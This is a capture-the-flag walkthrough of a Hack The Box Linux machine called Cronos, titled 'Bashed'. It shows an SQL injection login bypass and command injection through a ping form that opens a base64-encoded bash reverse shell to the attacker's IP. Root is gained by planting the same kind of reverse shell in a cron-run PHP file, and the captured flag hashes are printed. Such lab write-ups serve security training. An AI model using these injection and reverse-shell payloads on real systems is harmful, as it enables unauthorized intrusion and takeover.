# Bashed
>Author : Xyan1d3
>Date : 29th June 2021
>IP : 10.10.10.13
>OS : Linux
>Difficulty : Medium
# Initial Enumeration
## Nmap
```sql
# Nmap 7.91 scan initiated Wed Jun 30 01:45:34 2021 as: nmap -sC -sV -v -oN nmap/cronos 10.10.10.13
Nmap scan report for cronos.htb (10.10.10.13)
Host is up (0.076s latency).
Not shown: 997 filtered ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 18:b9:73:82:6f:26:c7:78:8f:1b:39:88:d8:02:ce:e8 (RSA)
|   256 1a:e6:06:a6:05:0b:bb:41:92:b0:28:bf:7f:e5:96:3b (ECDSA)
|_  256 1a:0e:e7:ba:00:cc:02:01:04:cd:a3:a9:3f:5e:22:20 (ED25519)
53/tcp open  domain  ISC BIND 9.10.3-P4 (Ubuntu Linux)
| dns-nsid: 
|_  bind.version: 9.10.3-P4-Ubuntu
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-favicon: Unknown favicon MD5: D41D8CD98F00B204E9800998ECF8427E
| http-methods: 
|_  Supported Methods: GET HEAD OPTIONS
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Cronos
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

## DNS Enumeration
We do a `dig` on the domain to check any available domain of this box.
```python
┌─[Magisk@Xyan1d3]─[10.10.14.11]─[~/htb/cronos]
└──╼ # dig ANY cronos.htb @10.10.10.13

; <<>> DiG 9.16.15-Debian <<>> ANY cronos.htb @10.10.10.13
;; global options: +cmd
;; Got answer:
;; ->>HEADER<<- opcode: QUERY, status: NOERROR, id: 32204
;; flags: qr aa rd ra; QUERY: 1, ANSWER: 3, AUTHORITY: 0, ADDITIONAL: 2

;; OPT PSEUDOSECTION:
; EDNS: version: 0, flags:; udp: 4096
;; QUESTION SECTION:
;cronos.htb.                    IN      ANY

;; ANSWER SECTION:
cronos.htb.             604800  IN      SOA     cronos.htb. admin.cronos.htb. 3 604800 86400 2419200 604800
cronos.htb.             604800  IN      NS      ns1.cronos.htb.
cronos.htb.             604800  IN      A       10.10.10.13

;; ADDITIONAL SECTION:
ns1.cronos.htb.         604800  IN      A       10.10.10.13

;; Query time: 80 msec
;; SERVER: 10.10.10.13#53(10.10.10.13)
;; WHEN: Wed Jun 30 01:48:40 IST 2021
;; MSG SIZE  rcvd: 131
```

We could add the domain names discovered on in our `/etc/hosts`.

## Web Enumeration
We visit the site and see that `10.10.10.13` , `ns1.cronos.htb` & `cronos.htb` has apache2 default page.
![[Pasted image 20210630015437.png]]

But, The `admin.cronos.htb` has a login page on visiting.
![[Pasted image 20210630015520.png]]

We could try default creds but it doesn't seem to work.
We try some basic SQL injection and we get in by `admin' OR '1'='1` in the username field.
![[Pasted image 20210630015744.png]]

We get into the site and find out that we have a field for entering the IP and we can do a `traceroute` or `ping`.
For, Some reason the `traceroute` command does not work so we will be trying to use the `ping` here.
![[Pasted image 20210630020020.png]]

Now, We may try to do some command execution. If we are allowed to do so.
![[Pasted image 20210630020238.png]]

The form is vulnerable to command injection, Now We may try to get a reverse shell from here.

# Initial FootHold as www-data
We enter this in the IP field and initiate a `ping` : `10.10.14.11;echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC4xMS84ODg4IDA+JjE= |base64 -d|bash;`

And, We get a reverse shell back as the user `www-data`.
```python
┌─[Magisk@Xyan1d3]─[10.10.14.11]─[~/htb/cronos]
└──╼ # shelter rev bash
Gtk-Message: 02:03:22.200: Failed to load module "colorreload-gtk-module"
Gtk-Message: 02:03:22.200: Failed to load module "window-decorations-gtk-module"
[+] Copied reverseshell payload echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC4xMS84ODg4IDA+JjE= |base64 -d|bash
[+] Starting up Shell Handler...
Listening on 0.0.0.0 8888
Connection received on 10.10.10.13 52372
bash: cannot set terminal process group (1382): Inappropriate ioctl for device
bash: no job control in this shell
www-data@cronos:/var/www/admin$ id
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

# Root Escalation
We check the `/etc/crontab` and find out an intersting command in the file which runs a php script as `root` which is writable by `www-data`.
```python
www-data@cronos:/var/www$ cat /etc/crontab
# /etc/crontab: system-wide crontab
# Unlike any other crontab you don't have to run the `crontab'
# command to install the new version when you edit this file
# and files in /etc/cron.d. These files also have username fields,
# that none of the other crontabs do.

SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# m h dom mon dow user  command
17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
* * * * *       root    php /var/www/laravel/artisan schedule:run >> /dev/null 2>&1
```

We could drop a reverse shell to get a shell back as `root`.
I used `system` and droped a bash reverse shell here.
```python
www-data@cronos:/var/www$ cat /var/www/laravel/artisan                              
#!/usr/bin/env php                                                                  
<?php
system("echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC4xMS85MDAxIDA+JjE= |base64 -d|bash");
/*
|--------------------------------------------------------------------------
| Register The Auto Loader

*** SNIP ***

```

Now, We wait for a minute to get a shell or `00` seconds to be more exact.

```python
┌─[Magisk@Xyan1d3]─[10.10.14.11]─[~/htb/cronos]
└──╼ # shelter rev bash
Gtk-Message: 02:18:37.120: Failed to load module "colorreload-gtk-module"
Gtk-Message: 02:18:37.121: Failed to load module "window-decorations-gtk-module"
[+] Copied reverseshell payload echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC4xMS85MDAxIDA+JjE= |base64 -d|bash
[+] Starting up Shell Handler...
Listening on 0.0.0.0 9001
Connection received on 10.10.10.13 42366
bash: cannot set terminal process group (2322): Inappropriate ioctl for device
bash: no job control in this shell
root@cronos:~# id
id
uid=0(root) gid=0(root) groups=0(root)
```

## Getting the User Flag
We could get the `user.txt` from the `/home/noulis/` directory.
```python
root@cronos:~# cd /home/noulis/
root@cronos:/home/noulis# ls -l
total 4
-r--r--r-- 1 noulis noulis 33 Mar 22  2017 user.txt
root@cronos:/home/noulis# cat user.txt 
51d236438b333970dbba7dc3089be33b
```

## Getting the Root Flag
We could get the `root.txt` from the `/root` directory.
```python
root@cronos:/home/noulis# cd /root/
root@cronos:~# ls -l
total 4
-r-------- 1 root root 33 Mar 22  2017 root.txt
root@cronos:~# cat root.txt 
1703b8a3c9a8dde879942c79d02fd3a0
```
